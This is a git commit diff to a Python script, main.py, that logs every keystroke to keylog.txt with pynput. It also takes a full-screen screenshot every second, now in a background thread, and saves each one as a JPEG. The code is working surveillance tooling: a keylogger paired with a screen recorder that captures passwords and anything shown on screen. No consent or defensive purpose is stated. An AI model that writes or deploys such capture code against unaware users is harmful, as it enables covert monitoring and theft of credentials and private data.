8e00be36a4c8365c478b2591ea60e90ddfa5e7ac
Nymerea <morgan-durand@laposte.net>
2021-12-05 21:24:40 +0100

    save cpu with threading image capture

--- main.py
+++ main.py
@@ -4,12 +4,13 @@
 # Press Double Shift to search everywhere for classes, files, tool windows, actions, and settings.
 from pynput.keyboard import Key, Listener
 import logging
-import mss
+
 import mss.tools
 import time
 import tkinter as tk
 import cv2 as cv
 import numpy as np
+import threading
 
 logging.basicConfig(filename="keylog.txt", level=logging.DEBUG, format=" %(asctime)s - %(message)s")
 
@@ -19,7 +20,7 @@ def on_press(key):
 
 
 # with mss.mss() as sct:
-def yolo(grabber):
+def yolo():
     root = tk.Tk()
     screen_width = root.winfo_screenwidth()
     screen_height = root.winfo_screenheight()
@@ -27,26 +28,24 @@ def yolo(grabber):
     monitor = {"top": 0, "left": 0, "width": screen_width, "height": screen_height}
     last_time = 0
     while "Screen capturing":
-        if time.time() - last_time > 1:
-            output = str(last_time) + ".jpeg".format(**monitor)
-            grabber.compression_level = 2
-            # Grab the data
-            sct_img = grabber.grab(monitor)
-            screenshot = np.array(sct_img)
+        grabber = mss.mss()
+        output = str(time.time()) + ".jpeg".format(**monitor)
+        grabber.compression_level = 2
+        # Grab the data
+        sct_img = grabber.grab(monitor)
+        screenshot = np.array(sct_img)
 
-            image = cv.pyrDown(screenshot)
-            cv.imwrite(output, image)
-            # Save to the picture file
-            # mss.tools.tp(sct_img.rgb, sct_img.size, output=output)
+        image = cv.pyrDown(screenshot)
+        cv.imwrite(output, image)
+        # Save to the picture file
+        # mss.tools.tp(sct_img.rgb, sct_img.size, output=output)
 
-            print(output)
-            last_time = time.time()
-
+        print(output)
+        time.sleep(1)
 
 with Listener(on_press=on_press) as listener:
-
-    sct = mss.mss()
-    yolo(sct)
+    x = threading.Thread(target=yolo)
+    x.start()
     listener.join()
 
 
